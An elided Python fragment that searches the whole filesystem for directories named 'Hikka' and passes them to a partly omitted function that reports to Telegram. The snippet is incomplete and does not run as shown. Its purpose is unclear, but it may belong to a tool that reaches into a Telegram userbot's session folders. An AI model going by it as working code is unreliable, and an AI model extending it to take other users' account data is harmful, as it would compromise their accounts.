...
def locate_directory():
    try:
        result = subprocess.run(
            ['find', '/', '-type', 'd', '-name', 'Hikka'],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        hikka_dirs = result.stdout.splitlines()
        if not hikka_dirs:
            raise FileNotFoundError("Hikka directories not found")
        return hikka_dirs
...
def report_to_telegram(link, reason):
    ...
    for directory_path in hikka_dirs:
        ...
        try:
            ...
            raise Exception(f"Error reporting to Telegram: {str(e)}")
